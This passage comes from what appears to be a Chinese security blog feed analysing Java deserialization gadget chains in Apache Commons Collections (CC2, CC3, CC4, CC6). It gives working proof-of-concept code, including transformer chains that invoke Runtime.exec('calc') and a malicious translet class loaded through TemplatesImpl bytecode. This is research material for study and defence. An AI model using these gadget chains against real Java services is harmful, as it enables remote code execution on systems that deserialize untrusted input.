Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125; &#125; &#125; BadAttributeValueExpException的readObject方法中调用了valObj的toString方法，valObj对象是通过从输入流读取val获取指定 Object 字段，也就是说我们需要把tiedMapEntry对象传递到val属性中，但是直接通过构造函数的话会直接调用toString方法，所以这里使用反射，先构造BadAttributeValueExpException对象传递null，完成实例化后通过反射修改val的值。 123456789101112131415161718Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val,tiedMapEntry); CommonsCollections6ysoserial Gadget chain： 1234567891011Gadget chain: java.io.ObjectInputStream.readObject() HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() CC6的HashMap.hash调用了hashCode方法，这个在URLDNS中有介绍到，这里就不赘述了。我们直接看HashMap.put()。 HashMap.put()12345678static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; put方法中调用了hash方法，传递一个key对象，那我们只需要把TiedMapEntry对象传递到key中，当调用hash方法就会就会返回TiedMapEntry.hashCode() 12345678910111213141516Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry,1); HashSet.readObject()12345678910111213141516171819202122232425262728293031323334353637383940414243private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in any hidden serialization magic s.defaultReadObject(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity &lt; 0) &#123; throw new InvalidObjectException(&quot;Illegal capacity: &quot; + capacity); &#125; // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123; throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); &#125; // Read size and verify non-negative. int size = s.readInt(); if (size &lt; 0) &#123; throw new InvalidObjectException(&quot;Illegal size: &quot; + size); &#125; // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Create backing HashMap map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ? new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) : new HashMap&lt;E,Object&gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) E e = (E) s.readObject(); map.put(e, PRESENT); &#125;&#125; 在HashSet.readObject方法中，跟进put()方法，进入java.util.HashMap中调用put()方法，接着调用hash()方法，进而调用key.hashCode()，这里只需要让key为TiedMapEntry对象即可。这里通过反射获取HashSet的class对象的map属性，然后通过get方法获取hashSet对象上map字段的值。再反射获取HashMap的class对象的table属性，然后通过get方法获取innImpl对象上table字段的值。table字段的值是Node&lt;K,V&gt;对象，这里我并不知道Node&lt;K,V&gt;对象是什么，只知道他是HashMap的内部类，之后获取Node&lt;K,V&gt;类的class对象并且获取key属性，将tiedMapEntry对象set给key属性，讲道理这里我并不是很理解，我只知道ysoserial工具是这样操作的。 123456789101112131415161718192021222324252627282930Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(r, r);Map&lt;TiedMapEntry,Integer&gt; map2 = new HashMap&lt;&gt;();HashSet hashSet = new HashSet(1);hashSet.add(&quot;foo&quot;);Field f = HashSet.class.getDeclaredField(&quot;map&quot;);f.setAccessible(true);HashMap innImpl = (HashMap) f.get(hashSet);Field f2 = HashMap.class.getDeclaredField(&quot;table&quot;);f2.setAccessible(true);Object[] array = (Object[]) f2.get(innImpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = node.getClass().getDeclaredField(&quot;key&quot;);keyField.setAccessible(true);keyField.set(node,tiedMapEntry);","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(三)","slug":"20220102","date":"2022-01-02T03:37:50.000Z","updated":"2022-01-10T07:30:03.014Z","comments":false,"path":"2022/01/02/20220102/","link":"","permalink":"https://self209.github.io/2022/01/02/20220102/","excerpt":"本文继续CommonsCollections3 和 CommonsCollections4 Gadget chain 分析，cc3可以说是cc1与cc2的结合，使用新的执行类InstantiateTransformer.Transformer与类加载代码执行相结合，入口类使用cc1的入口类。cc4则是cc2与cc3的结合，InstantiateTransformer.Transformer执行类与类加载代码执行相结合，入口类使用cc2的入口类。","text":"本文继续CommonsCollections3 和 CommonsCollections4 Gadget chain 分析，cc3可以说是cc1与cc2的结合，使用新的执行类InstantiateTransformer.Transformer与类加载代码执行相结合，入口类使用cc1的入口类。cc4则是cc2与cc3的结合，InstantiateTransformer.Transformer执行类与类加载代码执行相结合，入口类使用cc2的入口类。 CommonsCollections3漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 1234567891011121314Gadget chain： ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.Transformer() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 TrAXFilter.TrAXFilter()类加载代码执行我们在cc2的时候分析过了，这里直接来到TrAXFilter.TrAXFilter() 1234567891011public class TrAXFilter extends XMLFilterImpl &#123; public TrAXFilter(Templates templates) throws TransformerConfigurationException&#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); &#125;&#125; TrAXFilter类的构造方法中templates可控，将TemplatesImpl对象传递到TrAXFilter构造方法中，当调用newTransformer方法时机会触发恶意代码。 1234567891011121314151617public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); new TrAXFilter(templates); &#125; InstantiateTransformer.Transformer()InstantiateTransformer的Transformer方法刚好是获取class对象的构造方法newInstance创建实例化对象。我们将TrAXFilter类的class对象传递给InstantiateTransformer的Transformer方法，获取构造方法创建实例化对象，执行恶意代码。 12345678910111213141516171819202122232425262728293031public class InstantiateTransformer implements Transformer, Serializable &#123; public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123; super(); iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; try &#123; if (input instanceof Class == false) &#123; throw new FunctorException( &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;); &#125; catch (InstantiationException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex); &#125; &#125;&#125; 12345678910111213141516171819public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;TemplatesImpl.class&#125;, new Object[]&#123;templates&#125;); instantiateTransformer.transform(TrAXFilter.class); &#125; 入口类到InstantiateTransformer.Transformer()的链与cc1相同。 poc： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); byte[][] _bytecodes = new byte[][]&#123;code&#125;; Class c = templates.getClass(); Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;ok&quot;); Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, _bytecodes); Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;TemplatesImpl.class&#125;,new Object[]&#123;templates&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); //获取AnnotationInvocationHandler Class对象 Class b = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //获取构造方法 Constructor AnnotationInvocationHandlerConstructor = b.getDeclaredConstructor(Class.class,Map.class); //设置访问权限 AnnotationInvocationHandlerConstructor.setAccessible(true); //InvocationHandler 对象 InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r); //创建代理对象 Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); //将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo InvocationHandler ooo = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,proxyMap);// Serialize(ooo); unSerialize(&quot;ooo.txt&quot;); &#125; CommonsCollections4漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：4.0 gradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’ Gadget chain： 123456789101112131415Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.Transformer() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 cc4的入口类到TransformingComparator.compare()与cc2是一样的，执行类与cc3一样，利用InstantiateTransformer类与TrAXFilter类，这里不做赘述。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public class cc4 &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;priorityQueue.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, _bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(); priorityQueue.offer(1); priorityQueue.offer(2); Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,chainedTransformer); //Serialize(priorityQueue); unSerialize(&quot;priorityQueue.txt&quot;); &#125;&#125;","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(二)","slug":"20211229","date":"2021-12-29T11:15:39.000Z","updated":"2022-01-02T03:39:34.584Z","comments":false,"path":"2021/12/29/20211229/","link":"","permalink":"https://self209.github.io/2021/12/29/20211229/","excerpt":"本文继续CommonsCollections2 Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。","text":"本文继续CommonsCollections2 Gadget chain 分析，之前的环境是CommonsCollections3.2.1版本，commons-collections官方为了修复一些问题推出了commons-collections4，把原本不能序列化的TransformingComparator类，变为了可序列化，导致了反序列化漏洞cc2，并且采用了新的执行方式，通过类加载器实现代码执行。 漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：4.0 gradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’ Gadget chain： 123456789101112Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass()//将 byte 字节解析成虚拟机能够识别的Class对象。 类加载java类加载 类的加载连接和初始化 当 Java程序中需要使用到某个类时，虚拟机会保证这个类已经被加载、连接和初始化。而连接又包含验证、准备和解析这三个子过程，这个过程必须严格按照顺序执行。 类的加载 通过类的完全限定名（包名和类名）查找此类的字节码文件，把类的.class文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区内，然后利用字节码文件创建一个Class对象，用来封装类在方法区内的数据结构并存放在堆区内。这个过程是由类加载器完成的，我们后面会进行详细讲解。 连接 验证：确保被加载类的正确性。class 文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身的安全。 准备：为类的静态变量分配内存，并将其设置为默认值。此阶段仅仅只为静态类变量（即 static 修饰的字段变量）分配内存，并且设置该变量的初始值。（比如 static int num = 5，这里只将 num 初始化为0，5的值将会在初始化时赋值）。对于 final static 修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。 解析：把类中的符号引用转换为直接引用。符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针。相对偏移量或一个间接定位到目标的句柄。（可参考”虚拟机指令”相关内容） 初始化 类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。 利用类加载代码执行类加载器（除了根类加载器）都必须继承java.lang.ClassLoader。ClassLoader下有一个defineClass方法，它是将 byte 字节解析成虚拟机能够识别的Class对象。 TransletClassLoader 12345678910111213141516171819202122232425262728293031323334353637public final class TemplatesImpl implements Templates, Serializable &#123; static final class TransletClassLoader extends ClassLoader &#123; private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) &#123; super(parent); _loadedExternalExtensionFunctions = null; &#125; TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123; super(parent); _loadedExternalExtensionFunctions = mapEF; &#125; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; Class&lt;?&gt; ret = null; // The _loadedExternalExtensionFunctions will be empty when the // SecurityManager is not set and the FSP is turned off if (_loadedExternalExtensionFunctions != null) &#123; ret = _loadedExternalExtensionFunctions.get(name); &#125; if (ret == null) &#123; ret = super.loadClass(name); &#125; return ret; &#125; /** * Access to final protected superclass member from outer class. */ Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125; &#125; &#125; TemplatesImpl.defineClass()在TemplatesImpl类中自定义了类加载器，并且定义了defineClass方法接收byte字节数组，返回ClassLoader.defineClass方法解析成的class对象，如果byte字节数组b我们可以控制那我们就可以返回任意类的class对象。 123Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length);&#125; TemplatesImpl.defineTransletClasses()在TemplatesImpl.defineTransletClasses()方法中调用了defineClass方法，其中_tfactory不能等于null，才能顺利到loader.defineClass(_bytecodes[i]); _tfactory被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值，他并不会影像我们的Gadget chain执行到loader.defineClass，loader.defineClass它传递一个_ bytecodes二维数组将class对象返回给_class数组，_bytecodes二维数组是私有属性，我们可以通过反射赋值，那么我们就找哪里调用了defineTransletClasses方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283private transient TransformerFactoryImpl _tfactory = null;private byte[][] _bytecodes = null;private Class[] _class = null;private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125;private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException &#123; SecurityManager security = System.getSecurityManager(); if (security != null)&#123; String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET); if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(&quot;true&quot;))) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR); throw new UnsupportedOperationException(err.toString()); &#125; &#125; // We have to read serialized fields first. ObjectInputStream.GetField gf = is.readFields(); _name = (String)gf.get(&quot;_name&quot;, null); _bytecodes = (byte[][])gf.get(&quot;_bytecodes&quot;, null); _class = (Class[])gf.get(&quot;_class&quot;, null); _transletIndex = gf.get(&quot;_transletIndex&quot;, -1); _outputProperties = (Properties)gf.get(&quot;_outputProperties&quot;, null); _indentNumber = gf.get(&quot;_indentNumber&quot;, 0); if (is.readBoolean()) &#123; _uriResolver = (URIResolver) is.readObject(); &#125; _tfactory = new TransformerFactoryImpl(); &#125; TemplatesImpl.getTransletInstance()getTransletInstance方法调用了defineTransletClasses方法，_name不等于null， _class等于null就会调用defineTransletClasses方法，newInstance创建一个实例化对象，创建实例化对象，这个过程会执行静态变量赋值和静态代码块代码，如果我们传递的byte字节数组静态代码块中有恶意代码那么在创建实例化对象时就会执行。 1234567891011121314151617181920212223242526272829private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; TemplatesImpl.newTransformer()在newTransformer方法中调用了getTransletInstance方法，并且newTransformer方法是public。 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer; &#125; 当我们通过反射将_ bytecodes二维数组赋值为含有恶意代码的类的byte字节，调用newTransformer方法就会触发恶意代码。 CodeImplement： 1234567891011import java.io.IOException;public class CodeImplement &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 类加载代码执行： 1234567891011121314151617181920212223//获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates,&quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates,_bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); templates.newTransformer(); 代码执行： 发生报错，调试查看发现他会判断解析的对象的父类是不是ABSTRACT_TRANSLET常量，是的话就会把i赋值给_transletIndex，_transletIndex，默认等于-1，_transletIndex小于0就会报错，所以我们需要把存在恶意代码的类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就能解决。 12private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;private int _transletIndex = -1; CodeImplement： 123456789101112131415161718192021222324252627import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class CodeImplement extends AbstractTranslet&#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 编译成class文件，重写执行。 TransformingComparator.compare()执行类与cc1一样InvokerTransformer.transform()，只不过调用的是TemplatesImpl类newTransformer方法，这里我们就直接看TransformingComparator类的compare方法。 123456789101112131415161718public class TransformingComparator&lt;I, O&gt; implements 